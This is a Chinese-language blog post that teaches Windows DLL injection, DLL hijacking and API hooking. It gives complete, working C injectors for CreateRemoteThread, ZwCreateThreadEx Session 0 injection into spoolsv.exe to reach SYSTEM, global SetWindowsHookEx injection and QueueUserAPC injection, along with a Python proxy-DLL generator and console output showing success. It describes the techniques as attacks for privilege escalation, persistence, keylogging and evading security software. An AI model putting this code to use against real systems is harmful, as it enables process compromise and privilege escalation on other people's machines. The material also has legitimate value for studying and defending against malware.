---
layout: post

title: "windows dll注入和api hook"

date: 2025-12-12

tags: [windows]

comments: true

author: Exploooosion
---
<!-- more -->

# Windows DLL 注入和Api Hook

## DLL 注入

DLL 注入（DLL Injection）是指将一个外部的动态链接库（DLL）强制加载到目标进程的虚拟地址空间中，并使其代码在目标进程的上下文中执行的技术。

**核心原理：**
Windows 操作系统对进程实施了**虚拟内存隔离**机制，进程 A 无法直接访问进程 B 的内存。DLL 注入的本质是打破这种隔离，通过操作系统提供的调试 API 或机制，在目标进程的内存中写入恶意 DLL 的路径，并操纵目标进程的主动加载行为（通常是强制调用 `LoadLibrary` API），从而使恶意 DLL 成为目标进程的一部分。

一旦注入成功，DLL 将拥有与目标进程相同的权限（Process Token），能够访问其内存数据、挂钩 API 或作为跳板进行持久化攻击。

`MessageBoxDll.c`

```c
#include<stdio.h>
#include<windows.h>
#include<stdlib.h>

#define RUN_SUCESS 0
__declspec(dllexport) int __cdecl DownLoadFileFromUrl(int i)
{
    if(i==1)
    {
        MessageBox(NULL, TEXT("Start Exploooosion"), TEXT("Hacked"), MB_OK);
          return RUN_SUCESS;
    }
    else if(i==2)
    {
        MessageBox(NULL, TEXT("Stop Exploooosion"), TEXT("Hacked"), MB_OK);
          return RUN_SUCESS;
    }

}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
  switch (fdwReason)
  { 
    // 将dll文件附加到进程（加载到地址空间时）。
      case DLL_PROCESS_ATTACH:
          DownLoadFileFromUrl(1);
        break;
    // 在进程中创建了新线程之后会执行。
    case DLL_THREAD_ATTACH:
          break;
    // 进程中的线程退出时，执行的函数。
    case DLL_THREAD_DETACH:
          break;
    // 当dll从进程空间脱离（退出）时执行的进程。
    case DLL_PROCESS_DETACH:
        DownLoadFileFromUrl(2);
        break;
  }
  return TRUE;
}
```

### 经典远程线程注入 (Classic CreateRemoteThread)

这是最基础也是最通用的注入方式，旨在向普通用户进程注入 DLL。

#### 技术原理

攻击者进程在目标进程中开辟内存，写入 DLL 路径，然后“远程”命令目标进程创建一个新线程。这个新线程的唯一任务就是执行 `LoadLibrary` 函数，从而加载指定的 DLL。

#### 实现方法与流程 (参考 `classicdllinjection.c`)

1. **获取权限** ：获取目标进程句柄。
2. **分配内存** ：在目标进程空间中申请一块内存。
3. **写入数据** ：将 DLL 的完整路径写入刚才申请的内存。
4. **地址解析** ：计算 `LoadLibraryW` 函数在内存中的地址（通常利用 Kernel32.dll 在所有进程中基址相同的特性，或使用 PEB Walking 技术）。
5. **执行注入** ：创建远程线程调用 `LoadLibraryW`。

#### 1.3 核心 API 及作用

* `OpenProcess(PROCESS_ALL_ACCESS, ...)`：获取目标进程的操作句柄，需要足够的权限（如 `VM_WRITE`, `VM_OPERATION`）。
* `VirtualAllocEx(...)`： **关键步骤** 。在**目标进程**的内存空间中分配内存，用于存放 DLL 路径字符串。
* `WriteProcessMemory(...)`：将本地的 DLL 路径字符串复制到目标进程刚才分配的内存中。
* `GetRemoteModuleHandle` / `GetProcAddress`：获取 `LoadLibrary` 函数的地址。在你的代码中，使用了更高级的 PEB Walking 技术来查找模块基址。
* `CreateRemoteThread(...)`： **核心触发点** 。在目标进程中创建一个新线程，线程的入口点设为 `LoadLibrary`，参数设为 DLL 路径的内存地址。

```c
#include "injector.h"

// 执行 DLL 注入的核心逻辑
BOOL InjectDLL(DWORD pid, wchar_t* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return FALSE;
    }
    size_t pathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    // 1. 在目标进程分配内存
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("[-] VirtualAllocEx failed.\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    // 2. 写入 DLL 路径
    if (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    // 3. PEB Walking 获取 Kernel32 基址 (调用 injector.h 中的函数)
    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, L"kernel32.dll");
    if (hRemoteKernel32 == NULL) {
        printf("[-] Failed to find kernel32.dll in target process via PEB.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Found Remote Kernel32 Base: 0x%p\n", (void*)hRemoteKernel32);
    // 4. 计算 LoadLibraryW 的远程地址
    HMODULE hLocalKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, "LoadLibraryW");
    // 偏移量计算
    uintptr_t offset = (uintptr_t)pLocalLoadLibrary - (uintptr_t)hLocalKernel32;
    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((uintptr_t)hRemoteKernel32 + offset);
    printf("[+] Calculated Remote LoadLibraryA: 0x%p\n", pRemoteLoadLibrary);
    // 5. 创建远程线程
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pRemoteLoadLibrary, pRemoteMem, 0, NULL);
    if (!hThread) {
        printf("[-] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    if (hThread) {
        printf("[+] Remote thread created. Waiting for execution...\n");
        // 1. 等待线程结束 (即 LoadLibrary 执行完毕)
        WaitForSingleObject(hThread, INFINITE);
        // 2. 获取线程退出码 (这就是 LoadLibrary 的返回值)
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        if (exitCode == 0) {
            printf("[-] Injection FAILED. LoadLibrary returned NULL.\n");
            printf("    Possible causes:\n");
            printf("    1. DLL path is incorrect (Target process can't find it).\n");
            printf("    2. Architecture mismatch (Injecting 32-bit DLL into 64-bit Process).\n");
            printf("    3. Dependency missing.\n");
        } else {
            printf("[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n", exitCode);
        }
    }
    //printf("[+] Remote thread created successfully.\n");
    WaitForSingleObject(hThread, INFINITE);
    // 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    const wchar_t* targetProcessName = L"notepad.exe";
    wchar_t dllPath[MAX_PATH];
    // 使用 GetFullPathNameW
    if (GetFullPathNameW(L"MessageboxDll.dll", MAX_PATH, dllPath, NULL) == 0) {
        wprintf(L"Failed to get full path of DLL. Error: %d\n", GetLastError());
        return 1;
    }
    // 调用 injector.h 中的函数
    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0) {
        printf("[-] Process not found. Make sure it is running.\n");
        return 1;
    }
    printf("[+] Target PID: %lu\n", pid);
    printf("[*] Attempting injection via PEB walking (Compact Version)...\n");

    if (InjectDLL(pid, dllPath)) {
        printf("[+] Injection sequence completed successfully.\n");
    } else {
        printf("[-] Injection failed.\n");
    }
    return 0;
}
```

#### 1.4 攻击效果

* **效果** ：能够控制任何当前用户权限下的普通进程（如 Notepad, Chrome）。
* **局限** ：在 Windows Vista 以后，由于 Session 0 隔离机制，无法使用此 API 向系统服务注入。

```
PS C:\Users\Exploooosion\Desktop> .\Project4.exe                                                                        [+] Target PID: 9204                                                                                                    [*] Attempting injection via PEB walking (Compact Version)...                                                           [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryA: 0x00007FF8AABE0220                                                                  [+] Remote thread created. Waiting for execution...                                                                     [+] Injection SUCCESS. Remote DLL Handle: 0x64780000                                                                    [+] Injection sequence completed successfully.  
```

![1765524982009](../images/2025-12-12-windows_dll_injection/1765524982009.png)

### 突破 Session 0 隔离注入 (Session 0 Bypass)

针对系统服务和高权限进程的注入技术。

#### 技术原理

Windows 将服务和系统核心进程运行在 Session 0，而用户进程运行在 Session 1+。`CreateRemoteThread` 在跨 Session 操作时会失败。此技术通过调用底层的 Native API (`ZwCreateThreadEx`) 直接与内核交互，绕过 Win32 子系统的 Session 检查。

#### 实现方法与流程 (参考 `session0bypass.c`)

流程的前半部分（打开进程、分配内存、写入路径）与经典注入完全一致。唯一的区别在于最后一步“创建线程”的方式。

#### 核心 API 及作用

* `OpenProcess` / `VirtualAllocEx` / `WriteProcessMemory`：作用同上。
* `GetModuleHandle("ntdll.dll")` & `GetProcAddress`：获取 `ntdll.dll` 中的未文档化函数地址。
* `ZwCreateThreadEx(...)`： **核心触发点** 。这是一个内核级 API，比 `CreateRemoteThread` 更底层。它允许在特定的标志位设置下，忽略 Session 隔离限制，在 Session 0 的进程（如 `spoolsv.exe`, `svchost.exe`）中创建线程。

```c
#include "injector.h"

// 执行 DLL 注入的核心逻辑
BOOL InjectDLL(DWORD pid, const wchar_t* dllPath) {
    // 1. 获取目标进程句柄
    // 注意：操作 Session 0 服务进程通常需要 SeDebugPrivilege
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return FALSE;
    }
    size_t pathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    // 2. 在目标进程分配内存
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteMem) {
        printf("[-] VirtualAllocEx failed.\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    // 3. 写入 DLL 路径
    if (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathLen, NULL)) {
        printf("[-] WriteProcessMemory failed.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    // 4. PEB Walking 获取 Kernel32 基址
    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, L"kernel32.dll");
    if (hRemoteKernel32 == NULL) {
        printf("[-] Failed to find kernel32.dll in target process via PEB.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Found Remote Kernel32 Base: 0x%p\n", (void*)hRemoteKernel32);
    // 5. 计算 LoadLibraryW 的远程地址
    HMODULE hLocalKernel32 = GetModuleHandleW(L"kernel32.dll");
    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, "LoadLibraryW");
    uintptr_t offset = (uintptr_t)pLocalLoadLibrary - (uintptr_t)hLocalKernel32;
    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((uintptr_t)hRemoteKernel32 + offset);
    printf("[+] Calculated Remote LoadLibraryW: 0x%p\n", pRemoteLoadLibrary);
    // ============================================================
    //         使用 ZwCreateThreadEx 绕过 Session 0 隔离
    // ============================================================
    HANDLE hThread = NULL;
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to load ntdll.dll\n");
        return FALSE;
    }
    // 获取 ZwCreateThreadEx 地址
    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, "ZwCreateThreadEx");
    if (!ZwCreateThreadEx) {
        printf("[-] GetProcAddress for ZwCreateThreadEx failed.\n");
        return FALSE;
    }
    printf("[*] Calling ZwCreateThreadEx to bypass Session 0 isolation...\n");
    DWORD status = ZwCreateThreadEx(
        &hThread, 
        PROCESS_ALL_ACCESS, 
        NULL, 
        hProcess, 
        pRemoteLoadLibrary, 
        pRemoteMem, 
        0, // Flags / CreateSuspended = 0
        0, 0, 0, NULL
    );
    if (status != 0) { // 0 表示 STATUS_SUCCESS
        printf("[-] ZwCreateThreadEx failed. Status: 0x%lx\n", status);
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    if (hThread) {
        printf("[+] Remote thread created successfully via Native API.\n");
        WaitForSingleObject(hThread, INFINITE);
        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        if (exitCode == 0) {
            printf("[-] Injection FAILED. LoadLibrary returned NULL.\n");
        } else {
            printf("[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n", exitCode);
        }
  
        CloseHandle(hThread);
    }
    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

int main(int argc, char* argv[]) {
    // 默认目标改为 spoolsv.exe 以测试 Session 0 注入
    const wchar_t* targetProcessName = L"spoolsv.exe"; 
    wchar_t dllPath[MAX_PATH];
    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege Enabled.\n");
    if (GetFullPathNameW(L"MessageboxDllforSystem.dll", MAX_PATH, dllPath, NULL) == 0) {
        wprintf(L"[-] Failed to get full path of DLL. Error: %d\n", GetLastError());
        return 1;
    }
    // 查找 PID
    wprintf(L"[*] Searching for process: %s\n", targetProcessName);
    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0) {
        printf("[-] Process not found. Make sure it is running.\n");
        return 1;
    }
    printf("[+] Target PID: %lu\n", pid);
    // 执行注入
    if (InjectDLL(pid, dllPath)) {
        printf("[+] Injection sequence completed successfully.\n");
    } else {
        printf("[-] Injection failed.\n");
    }

    return 0;
}
```

#### 攻击效果 (最厉害的效果)

* **权限提升 (Privilege Escalation)** ：成功注入系统服务后，DLL 将获得 **SYSTEM (NT AUTHORITY\SYSTEM)** 权限。
* **完全控制** ：这是 Windows 系统中的最高权限，可以无限制地修改系统文件、注册表，甚至转储密码哈希 (LSASS)。

```
PS C:\Users\Exploooosion\Desktop> .\Project4.exe                                                                        [+] SeDebugPrivilege Enabled.                                                                                           [*] Searching for process: spoolsv.exe                                                                                  [+] Target PID: 4816                                                                                                    [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryW: 0x00007FF8AABE0220                                                                  [*] Calling ZwCreateThreadEx to bypass Session 0 isolation...                                                           [+] Remote thread created successfully via Native API.                                                                  [+] Injection SUCCESS. Remote DLL Handle: 0x658C0000                                                                    [+] Injection sequence completed successfully.  
========================================
[+] Time: (New Injection Event)
[+] Process ID   : 4816
[+] Session ID   : 0 (0 means System Service Session)
[+] Current User : SYSTEM
[RESULT] -> SUCCESS! Running as NT AUTHORITY\SYSTEM
========================================
```

![1765532204002](../images/2025-12-12-windows_dll_injection/1765532204002.png)

### 注册表注入 (Registry Modification)

利用 Windows 加载机制的“被动”注入，常用于持久化。

#### 技术原理

Windows 的 `User32.dll` 在初始化时会读取特定的注册表键值。如果配置了 `AppInit_DLLs`，所有加载 `User32.dll` 的进程（即几乎所有 GUI 程序）在启动时都会自动加载列表中的 DLL。

#### 实现方法

不依赖内存操作 API，而是通过修改注册表键值。

* 路径：`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`
* 操作：设置 `LoadAppInit_DLLs` 为 1，并在 `AppInit_DLLs` 中填入恶意 DLL 路径。

#### 核心 API 及作用

* `RegOpenKeyEx` / `RegSetValueEx`：用于修改注册表键值。
* `User32.dll` (系统机制)：当它被加载时，会自动解析上述注册表项并调用 `LoadLibrary`。

#### 攻击效果

* **持久化 (Persistence)** ：重启后依然有效。
* **广撒网** ：系统中几乎所有有界面的程序都会被注入，无需针对特定 PID。
* *注：在开启 Secure Boot 的现代系统中，此功能通常被禁用。*

### 消息钩子注入 (SetWindowsHookEx)

利用 Windows 消息传递机制的注入，常用于监控用户行为。

#### 技术原理

Windows 允许程序安装“钩子”来截获系统消息（如键盘、鼠标事件）。如果安装的是 **全局钩子** （Global Hook），操作系统为了让回调函数能处理其他进程的消息，必须将包含回调函数的 DLL 强制映射到所有接收该消息的进程空间中。

#### 实现方法与流程 (参考 `hookinjection.c`, `GlobalHookDll.c`)

1. **编写 DLL** ：DLL 中必须包含钩子回调函数（如 `MyHookProc`）和导出安装函数。
2. **安装钩子** ：加载器（Loader）加载 DLL，获取回调函数地址，调用 `SetWindowsHookEx`。
3. **触发注入** ：一旦发生相关事件（如鼠标移动、按键），OS 自动将 DLL 注入到受影响的进程。

#### 核心 API 及作用

* `LoadLibrary` / `GetProcAddress`：在加载器中加载恶意 DLL 并获取导出函数地址。
* `SetWindowsHookEx(WH_GETMESSAGE, hookProc, hDll, 0)`： **核心触发点** 。
  * `WH_GETMESSAGE` / `WH_KEYBOARD`：指定监听的消息类型。
  * 最后一项参数 `0`：表示 **全局钩子** ，这是触发系统级注入的关键，它告诉 OS 监控所有线程。
* `CallNextHookEx`：在 DLL 回调函数中调用，确保消息能继续传递，防止系统卡死。

`GlobalHookDll.c`

```c
// GlobalHookDll.c
// 编译命令: gcc -shared -o GlobalHookDll.dll GlobalHookDll.c
#include <windows.h>
#include <stdio.h>
// 宏定义：方便导出函数
#define DLLEXPORT __declspec(dllexport)
// 全局变量保存句柄和实例
HHOOK g_hHook = NULL;
HINSTANCE g_hInst = NULL;
// =============================================================
// 1. 钩子回调函数 (业务逻辑)
// =============================================================
LRESULT CALLBACK MyHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // 只有当nCode >= 0时才处理消息
    if (nCode >= 0) {
        // 为了演示，我们只在记事本里弹窗 (防止系统卡死)
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
  
        if (strstr(path, "notepad.exe") || strstr(path, "Notepad.exe")) {
            // 简单的防重入标志，防止一个消息弹无数次窗
            static int hasPopped = 0;
            if (hasPopped == 0) {
                MessageBoxA(NULL, "Exploooosion!", "Hacked", MB_OK);
                hasPopped = 1; 
            }
        }
    }
    // 必须调用下一个钩子 [cite: 6]
    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}
// =============================================================
// 2. 导出函数：安装钩子 (参考附件 StartHook)
// =============================================================
DLLEXPORT void StartHook() {
    if (g_hHook == NULL) {
        // 在这里调用 API，而不是在 EXE 里
        // 参数 3 使用 g_hInst，这是 DllMain 获取到的自身模块句柄
        // 参数 4 填 0，代表全局注入 [cite: 7]
        g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MyHookProc, g_hInst, 0);
  
        if (g_hHook) {
            printf("[DLL] Hook installed successfully.\n");
        } else {
            printf("[DLL] Failed to install hook. Error: %lu\n", GetLastError());
        }
    }
}
// =============================================================
// 3. 导出函数：卸载钩子 (参考附件 StopHook)
// =============================================================
DLLEXPORT void StopHook() {
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
        printf("[DLL] Hook removed.\n");
    }
}
// =============================================================
// 4. DllMain：获取自身句柄
// =============================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // 保存 DLL 自身的实例句柄，StartHook 需要用到它 [cite: 9]
        g_hInst = hinstDLL; 
        break;
    }
    return TRUE;
}
```

`hookinjection.c`

```c
// HookLoader.c
// 编译命令: gcc -o HookLoader.exe HookLoader.c
#include <windows.h>
#include <stdio.h>
// 定义函数指针类型，方便调用 DLL 里的函数
typedef void (*PFN_StartHook)();
typedef void (*PFN_StopHook)();
int main() {
    HMODULE hDll = NULL;
    PFN_StartHook StartHook = NULL;
    PFN_StopHook StopHook = NULL;
    // 1. 加载 DLL
    hDll = LoadLibraryA("GlobalHookDll.dll");
    if (!hDll) {
        printf("[-] Failed to load DLL.\n");
        return 1;
    }
    // 2. 获取 DLL 中导出的 StartHook 和 StopHook 函数地址
    StartHook = (PFN_StartHook)GetProcAddress(hDll, "StartHook");
    StopHook  = (PFN_StopHook)GetProcAddress(hDll, "StopHook");

    if (!StartHook || !StopHook) {
        printf("[-] Failed to find exported functions.\n");
        return 1;
    }
    // 3. 启动钩子
    printf("[Loader] Calling StartHook()...\n");
    StartHook(); // 直接调用 DLL 内部的逻辑
    printf("[+] Hook is running globally.\n");
    printf("[!] Press ENTER to stop the hook and exit...\n");
    // 4. 阻塞主线程
    // 再次强调：Loader 必须活着，因为钩子是挂在这个进程名下的。
    // 如果 Loader 退出，StartHook 安装的钩子会被系统强制注销。
    getchar();
    // 5. 卸载钩子
    printf("[Loader] Calling StopHook()...\n");
    StopHook();
    FreeLibrary(hDll);
    return 0;
}
```

#### 攻击效果

* **键盘记录 (Keylogger)** ：通过 `WH_KEYBOARD` 钩子记录所有程序的键盘输入。
* **隐蔽执行** ：不需要创建新线程，代码在目标进程的主 UI 线程中执行。

![1765605236779](../images/2025-12-12-windows_dll_injection/1765605236779.png)

![1765605309784](../images/2025-12-12-windows_dll_injection/1765605309784.png)

### APC 注入 (QueueUserAPC)

利用线程异步过程调用队列的“隐蔽”注入技术。

#### 技术原理

每个线程都有一个 APC（Asynchronous Procedure Call）队列。操作系统允许一个进程向另一个进程的线程队列中插入一个函数调用。当该目标线程进入“可警醒状态”（Alertable State，例如调用 `SleepEx`）时，它会优先执行队列中的函数。

#### 实现方法与流程 (参考 `ApcInjector.c`)

1. **准备环境** ：打开目标进程，分配内存，写入 DLL 路径（同 CreateRemoteThread）。
2. **枚举线程** ：获取目标进程的所有线程 ID（因为 APC 是针对线程的）。
3. **插入请求** ：遍历每一个线程，调用 `QueueUserAPC` 将 `LoadLibrary` 插入队列。
4. **等待触发** ：攻击者无法主动触发，只能等待目标线程自行进入可警醒状态。

#### 核心 API 及作用

* `CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, ...)`：拍摄系统快照，用于枚举所有线程。
* `Thread32First` / `Thread32Next`：遍历查找属于目标 PID 的线程 ID。
* `OpenThread(THREAD_SET_CONTEXT, ...)`：获取目标线程句柄，必须拥有设置上下文的权限。
* `QueueUserAPC(pLoadLibrary, hThread, pRemoteMem)`： **核心触发点** 。将 `LoadLibrary` 函数排队到目标线程的执行计划中。

```c
#include "injector.h"
#include <stdio.h>
// 编译命令: gcc -o ApcInjector.exe ApcInjector.c
// 确保 injector.h 在同级目录
int main() {
    const wchar_t* targetProcessName = L"notepad.exe";
    wchar_t dllPath[MAX_PATH];
    // 使用 GetFullPathNameW
    if (GetFullPathNameW(L"MessageboxDll.dll", MAX_PATH, dllPath, NULL) == 0) {
        wprintf(L"Failed to get full path of DLL. Error: %d\n", GetLastError());
        return 1;
    }
    // =======================================
    // 1. 获取目标进程 PID
    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0) {
        printf("[-] Target process not found: %ls\n", targetProcessName);
        return 1;
    }
    printf("[+] Found PID: %lu\n", pid);
    // 2. 尝试提权 (如果是注入系统进程则必须，普通进程可选)
    if (EnableDebugPrivilege()) {
        printf("[+] SeDebugPrivilege enabled.\n");
    }
    // 3. 打开目标进程
    // 需要 PROCESS_ALL_ACCESS 或至少 VM_WRITE/VM_OPERATION 权限 [cite: 29]
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }
    // 4. 在目标进程分配内存
    size_t pathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT, PAGE_READWRITE); // [cite: 30]
    if (!pRemoteMem) {
        printf("[-] VirtualAllocEx failed.\n");
        CloseHandle(hProcess);
        return 1;
    }
    // 5. 写入 DLL 路径
    if (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathSize, NULL)) { // [cite: 31]
        printf("[-] WriteProcessMemory failed.\n");
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written to remote memory.\n");
    // 6. 获取 LoadLibraryW 地址
    // Kernel32.dll 在所有进程中的基址通常相同，所以直接取本地地址即可 [cite: 32]
    PTHREAD_START_ROUTINE pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    if (!pLoadLibrary) {
        printf("[-] Failed to get LoadLibraryW address.\n");
        return 1;
    }
    // 7. 获取目标进程的所有线程
    DWORD* pThreadIds = NULL;
    DWORD threadCount = 0;
    if (!GetProcessThreadList(pid, &pThreadIds, &threadCount)) { // 使用 injector.h 中的函数
        printf("[-] Failed to enumerate threads.\n");
        return 1;
    }
    printf("[*] Enumerated %lu threads in target process.\n", threadCount);
    // 8. 遍历线程并插入 APC
    int successCount = 0;
    for (DWORD i = 0; i < threadCount; i++) {
        // 打开线程，必须拥有 THREAD_SET_CONTEXT 访问权限才能通过 QueueUserAPC 注入 
        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, pThreadIds[i]); // [cite: 36]
        if (hThread) {
            // 核心函数：QueueUserAPC 
            // 参数1: 要执行的函数 (LoadLibraryW)
            // 参数2: 目标线程句柄
            // 参数3: 传递给函数的参数 (远程内存中的 DLL 路径)
            if (QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteMem)) { // [cite: 37]
                successCount++;
                // printf("[+] APC queued for Thread ID: %lu\n", pThreadIds[i]);
            }
            CloseHandle(hThread);
        }
    }
    printf("[+] Successfully queued APC to %d threads.\n", successCount);
    printf("[!] Waiting for target threads to enter 'Alertable State' (e.g. SleepEx) to trigger execution...\n");
    // 清理
    if (pThreadIds) VirtualFree(pThreadIds, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    // 注意：不要过早 VirtualFreeEx pRemoteMem，因为目标线程可能还没执行 APC。
    // 在实际恶意软件中，通常就不释放了，或者等待很长时间。
    return 0;
}
```

#### 攻击效果

* **高隐蔽性 (Stealth)** ： **不创建新线程** 。大多数安全软件会监控 `CreateRemoteThread`，但对 `QueueUserAPC` 的监控相对较少。代码复用目标进程现有的线程执行。
* **局限性** ：依赖于目标进程的行为（必须调用 `SleepEx` 等函数），如果目标线程太忙或不进入可警醒状态，注入可能永远不会触发。

![1765616757981](../images/2025-12-12-windows_dll_injection/1765616757981.png)

## dll劫持

在Windows系统中运行可执行文件时，系统会调用相应需要的.dll文件，系统的默认优先级规则是最优先调用是当前目录下的.dll链接库，寻找不到则去系统目录下寻找。或者程序会动态生成目录然后使用loadlibrary去动态调用。

如果程序没有使用SetDllDirectory()函数设定dll加载绝对路径，则程序很大可能性即存在dll劫持注入漏洞。

### dll搜索顺序

dll的搜索顺序一直在变化，包括使用一些安全手段来改变搜索顺序。一般的顺序如下

1. 应用程序加载的目录
2. 系统目录，使用 GetSystemDirectory 获取该路径
3. 16 位系统目录
4. Windows 目录，使用 GetWindowsDirectory 获取该路径
5. 当前目录
6. PATH 环境变量中列出的目录

如果要加载的 dll 模块属于 Known DLLs，系统直接加载系统目录下的该 dll，不会进行搜索。

Known DLLs 列表：`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`

![1765687938486](../images/2025-12-12-windows_dll_injection/1765687938486.png)

### 实现方法

恶意dll无法做到完全复刻原本的dll的所有函数功能，只能通过函数转发的方式

![1765844966874](../images/2025-12-12-windows_dll_injection/1765844966874.png)

使用Python 脚本（配合 `pefile` 库）把原 DLL 所有的函数名（如 `malloc`, `printf`, `free`...）和序号全部读出来，自动按照链接器的语法格式，生成 `.def` 文件

```python
import os
import pefile
import sys

target_dll = "version.dll"
proxy_dll = "old" + target_dll

# 1. 检查并重命名原文件
if os.path.exists(target_dll):
    print(f"[*] Renaming {target_dll} -> {proxy_dll}")
    os.rename(target_dll, proxy_dll)
elif os.path.exists(proxy_dll):
    print(f"[*] {target_dll} already renamed to {proxy_dll}, skipping rename.")
else:
    print(f"[-] Error: Could not find {target_dll} or {proxy_dll}")
    sys.exit(1)

# 2. 解析 DLL
try:
    pe = pefile.PE(proxy_dll)
except Exception as e:
    print(f"[-] PE Parse Error: {e}")
    sys.exit(1)

def_file = target_dll.replace(".dll", ".def")
print(f"[*] Generating {def_file}...")

forward_module = proxy_dll.replace(".dll", "")

with open(def_file, "w", encoding='utf-8') as file:
    file.write(f'LIBRARY {target_dll}\nEXPORTS\n')
  
    count = 0
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if export.name:
                func_name = export.name.decode()
                # 格式: 导出函数名 = 转发模块.原函数名 @序号
                line = f"{func_name}={forward_module}.{func_name}\t@{export.ordinal}"
                file.write("\t" + line + "\n")
                count += 1
            else:
                pass 
    else:
        print("[-] No export table found!")
print(f"[+] Done! Generated {count} exports.")
print(f"[+] Compile command: gcc -shared my_hack.c {def_file} -o {target_dll}")
```

使用 `gcc -shared -o payload.dll payload.c payload.def`进行编译

![1765845870344](../images/2025-12-12-windows_dll_injection/1765845870344.png)

### 攻击效果

![1765691259175](../images/2025-12-12-windows_dll_injection/1765691259175.png)

![1765691304640](../images/2025-12-12-windows_dll_injection/1765691304640.png)

## windows hook-R3

Hook（钩子）技术的核心在于截获软件执行流或消息流，在目标函数执行前、执行中或执行后插入自定义逻辑。根据介入层级和实现方式的不同，可以分为应用层 Hook（Ring 3）、调试型 Hook 、底层虚拟化 Hook（Ring -1）以及内核Hook（Ring 0）。

